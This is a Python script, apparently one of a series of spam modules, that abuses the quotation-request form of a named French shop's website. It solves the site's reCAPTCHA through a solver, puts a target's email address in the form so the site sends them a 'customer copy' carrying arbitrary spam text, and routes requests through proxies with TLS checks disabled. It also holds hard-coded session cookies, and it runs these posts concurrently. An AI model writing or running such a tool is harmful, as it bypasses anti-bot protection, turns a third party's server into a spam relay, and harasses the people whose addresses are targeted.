from os.path import basename

import requests

import module

cookies = {
    'PHPSESSID': 'hevqo3h3actsr2hlum6037mo5d',
    'PrestaShop-a6530979075b9500fc98d5958ea98ffb': 'def50200c457a782348a047b3f1bf0f0ea7dbbe6d5e28b12fe6cf0741041697e7e41e83dc5a715b757ebb61e61262b310a326d542119105c88bc646fc97c447ae4c72ea32ed848b8c51984e6ebd522e31ae4d5925b5f0a27ec266d1f968512a336af56dc49eab089e1331e9dda1d4fa56dbade9fe440d83c4e8ce50d72307b5113bb2355efe841cc60405d7cefb16f0ef1d1d6e39e8d3216ddb8eea1be96f59d72247165dd10575efcb2a68908f3946ce903459d7518909cdceae13b9e05de699d9fac6e418d9e297fbcd6739dd30ebcd10ea1e4b0b7582c0e011a36648e33591e614ee0c1444161c315121bb91adebaeefc4c3f35262d5cc3fdd4ae176e8e8027ee83a2',
}

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryHqjwBaO5NqifN8ol',
    'Origin': 'https://www.anox.fr',
    'Referer': 'https://www.anox.fr/en/module/roja45quotationspro/QuotationsProFront?action=quoteSummary&module=roja45quotationspro',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}


class ConcreteSpam(module.Spam):

    def post(self, target) -> requests.Response | None:
        cap = self.solve_captcha(
            'https://www.anox.fr/en/module/roja45quotationspro/QuotationsProFront?action=quoteSummary&module=roja45quotationspro',
            '6LcJgVcaAAAAACpHAODb_VxINSw3Q_99h1dWdYs3', version='v3')
        if not cap:
            return
        data = '------WebKitFormBoundaryHqjwBaO5NqifN8ol\r\nContent-Disposition: form-data; name="action"\r\n\r\nsubmitRequest\r\n------WebKitFormBoundaryHqjwBaO5NqifN8ol\r\nContent-Disposition: form-data; name="ROJA45QUOTATIONSPRO_FORMDATA"\r\n\r\n{"columns":[{"heading":"","num":1,"fields":[{"pos":0,"name":"ROJA45QUOTATIONSPRO_FIRSTNAME","type":"TEXT","label":"First Name","value":"firstname"},{"pos":1,"name":"ROJA45QUOTATIONSPRO_LASTNAME","type":"TEXT","label":"Last Name","value":"last"},{"pos":2,"name":"ROJA45QUOTATIONSPRO_EMAIL","type":"TEXT","label":"Email Address","value":"wezxasqw@gmail.com"},{"pos":3,"name":"ROJA45QUOTATIONSPRO_VotreRefDeDemande","type":"TEXT","label":"","value":"refdedemande"},{"pos":4,"name":"ROJA45QUOTATIONSPRO_Message","type":"TEXTAREA","label":"","value":"test"},{"pos":5,"name":"Code_Postal_Livraison","type":"TEXT","label":"","value":"13132231321"},{"pos":6,"name":"Pays_de_livraison","type":"COUNTRY","label":"","value":"Belgique","id":"3"}]},{"fields":[]}]}\r\n------WebKitFormBoundaryHqjwBaO5NqifN8ol\r\nContent-Disposition: form-data; name="ROJA45QUOTATIONSPRO_FIRSTNAME"\r\n\r\nfirstname\r\n------WebKitFormBoundaryHqjwBaO5NqifN8ol\r\nContent-Disposition: form-data; name="ROJA45QUOTATIONSPRO_LASTNAME"\r\n\r\nlast\r\n------WebKitFormBoundaryHqjwBaO5NqifN8ol\r\nContent-Disposition: form-data; name="ROJA45QUOTATIONSPRO_EMAIL"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryHqjwBaO5NqifN8ol\r\nContent-Disposition: form-data; name="ROJA45QUOTATIONSPRO_VotreRefDeDemande"\r\n\r\nrefdedemande\r\n------WebKitFormBoundaryHqjwBaO5NqifN8ol\r\nContent-Disposition: form-data; name="ROJA45QUOTATIONSPRO_Message"\r\n\r\ntest\r\n------WebKitFormBoundaryHqjwBaO5NqifN8ol\r\nContent-Disposition: form-data; name="Code_Postal_Livraison"\r\n\r\n13132231321\r\n------WebKitFormBoundaryHqjwBaO5NqifN8ol\r\nContent-Disposition: form-data; name="Pays_de_livraison"\r\n\r\n3\r\n------WebKitFormBoundaryHqjwBaO5NqifN8ol\r\nContent-Disposition: form-data; name="UploadReceipt"\r\n\r\n1\r\n------WebKitFormBoundaryHqjwBaO5NqifN8ol\r\nContent-Disposition: form-data; name="uploadedfile[]"; filename=""\r\nContent-Type: application/octet-stream\r\n\r\n\r\n------WebKitFormBoundaryHqjwBaO5NqifN8ol\r\nContent-Disposition: form-data; name="ROJA45QUOTATIONSPRO_CUSTOMER_COPY"\r\n\r\non\r\n------WebKitFormBoundaryHqjwBaO5NqifN8ol\r\nContent-Disposition: form-data; name="g-recaptcha-response"\r\n\r\ncaptcha_field\r\n------WebKitFormBoundaryHqjwBaO5NqifN8ol--\r\n'
        data = data.replace('captcha_field', cap)
        data = data.replace('wezxasqw@gmail.com', target)
        data = data.replace('test', self.get_text())
        for _ in range(10):
            try:
                response = requests.post(
                    'https://www.anox.fr/en/module/roja45quotationspro/QuotationsProFront',
                    cookies=cookies,
                    headers=headers,
                    data=data.encode(), proxies=self.get_proxies(), verify=False
                )
                return response
            except Exception as e:
                print(e)


def main():
    spam = ConcreteSpam(basename(__file__)[:-3], 'Many thanks, we have received your request.')
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
